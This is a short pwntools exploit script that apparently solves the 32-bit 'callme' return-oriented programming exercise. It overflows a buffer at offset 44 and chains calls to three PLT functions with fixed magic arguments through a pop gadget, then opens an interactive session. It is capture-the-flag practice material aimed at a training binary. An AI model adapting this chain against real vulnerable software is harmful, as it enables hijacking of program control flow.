from pwn import *

exe = ELF('./callme32')
context.binary = exe
context.log_level = 'debug'

libc = ELF('./callme32')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(exe.path)

offset = 44 #pattern search $eip

callme1 = exe.plt['callme_one']
callme2 = exe.plt['callme_two']
callme3 = exe.plt['callme_three']

pop_esi_edi_ebp = 0x080487f9 

callme_one_arg = 0xdeadbeef
callme_two_arg = 0xcafebabe
callme_three_arg = 0xd00df00d


payload = flat({offset:[callme1,
                        pop_esi_edi_ebp,
                        callme_one_arg,
                        callme_two_arg,
                        callme_three_arg,
                        callme2,
                        pop_esi_edi_ebp,
                        callme_one_arg,
                        callme_two_arg,
                        callme_three_arg,
                        callme3,
                        pop_esi_edi_ebp,
                        callme_one_arg,
                        callme_two_arg,
                        callme_three_arg,]})

io.sendline(payload)

io.interactive()
